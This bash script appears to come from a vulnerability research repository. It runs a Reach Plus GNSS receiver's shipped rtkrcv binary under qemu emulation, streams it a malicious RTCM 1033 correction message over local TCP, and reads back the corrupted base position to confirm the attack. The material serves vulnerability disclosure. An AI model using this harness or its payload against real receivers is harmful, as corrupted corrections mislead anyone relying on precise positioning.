#!/bin/bash
# Run Reach Plus's ACTUAL shipped rtkrcv binary under qemu-user emulation,
# feed it the malicious correction stream over a local TCP connection
# standing in for the radio link, and read the corrupted base position back
# through its own telnet console -- the same interface a real operator
# would use. Nothing here is a reimplementation: same binary, same config,
# same decode path as research/README.md's "Dynamic confirmation" section.
#
#   ROOTFS=/path/to/extracted-reach-plus-rootfs \
#   QEMU=/path/to/qemu-aarch64-static \
#   ./reach_qemu_demo.sh
#
# Getting ROOTFS and QEMU: see the "Reproduce" block in
# research/README.md, "The shipped firmware, not just the source" and
# "Dynamic confirmation: the shipped binary, running, live". Neither is
# checked into this repo (multi-GB firmware image; qemu .deb) -- this
# script only automates what's already been done once by hand.
#
# No root anywhere in this chain, on either side: the firmware was read
# with debugfs (no mount), and qemu-user-static was downloaded as a .deb
# and unpacked with dpkg-deb -x (no install).
set -u

ROOTFS="${ROOTFS:?set ROOTFS to the extracted Reach Plus filesystem (see research/README.md)}"
QEMU="${QEMU:?set QEMU to the path of qemu-aarch64-static}"
PY="${PY:-python3}"
T="${T:-/tmp/reach-qemu-demo}"
RTKRCV_DIR="$ROOTFS/usr/bin/RTKLIB/app/rtkrcv/gcc"

for f in "$ROOTFS" "$QEMU" "$RTKRCV_DIR/rtkrcv" "$RTKRCV_DIR/../rtk.conf"; do
    [ -e "$f" ] || { echo "missing: $f" >&2; exit 1; }
done

mkdir -p "$T"
echo "### generating the correction stream (gen_rtcm.py, n1=211) ###"
"$PY" gen_rtcm.py "$T/benign.bin" --benign
"$PY" gen_rtcm.py "$T/attack.bin" --len 211

echo
echo "### starting the correction server on 127.0.0.1:9000 ###"
"$PY" rtcm_stream_server.py "$T/benign.bin" "$T/attack.bin" \
    --port 9000 --settle 6 --attack-secs 15 > "$T/server.log" 2>&1 &
SERVER_PID=$!

echo
echo "### starting rtkrcv under qemu (real binary, real config, no changes) ###"
# </dev/null: launched with no controlling tty here, and rtkrcv's local
# console reads stdin even with -p set for the telnet one -- without this it
# blocks forever on that read and never gets to opening the stream server,
# which looks identical to "didn't start" from the outside.
( cd "$RTKRCV_DIR" && \
  "$QEMU" -L "$ROOTFS" ./rtkrcv -s -p 9001 -t 5 -o ../rtk.conf \
      < /dev/null > "$T/rtkrcv.log" 2>&1 ) &

cleanup() {
    "$PY" rtkrcv_console.py --port 9001 shutdown --quiet >/dev/null 2>&1
    # PIDs above are the wrapper subshells, not qemu/python themselves (a
    # subshell's $! doesn't track its exec'd children) -- pkill by name
    # instead of trusting them.
    pkill -f 'qemu-aarch64-static.*rtkrcv' 2>/dev/null
    pkill -f 'rtcm_stream_server.py' 2>/dev/null
}
trap cleanup EXIT

wait_for() {  # wait_for <marker> <timeout_s>
    local marker="$1" timeout="$2" waited=0
    while ! grep -q "$marker" "$T/server.log" 2>/dev/null; do
        sleep 1
        waited=$((waited + 1))
        [ "$waited" -ge "$timeout" ] && { echo "timed out waiting for $marker" >&2; exit 1; }
    done
}

echo
echo "### waiting for rtkrcv to connect and the base position to settle ###"
wait_for CONNECTED 20
wait_for SETTLED 20
BEFORE=$("$PY" rtkrcv_console.py --port 9001 status --quiet 2>/dev/null \
         | grep 'pos xyz (m) base')
echo "before the attack: $BEFORE"

echo
echo "### malicious 1033 now streaming (n1=211, ~15s) ###"
wait_for DONE 25
AFTER=$("$PY" rtkrcv_console.py --port 9001 status --quiet 2>/dev/null \
        | grep 'pos xyz (m) base')
echo "after the attack:  $AFTER"

echo
echo "### result ###"
echo "true base position: -2694685.4730 -4293642.3660 3857878.9240"
echo "  $BEFORE"
echo "  $AFTER"
echo "trace file (max verbosity): $(ls -t "$RTKRCV_DIR"/*.trace 2>/dev/null | head -1)"
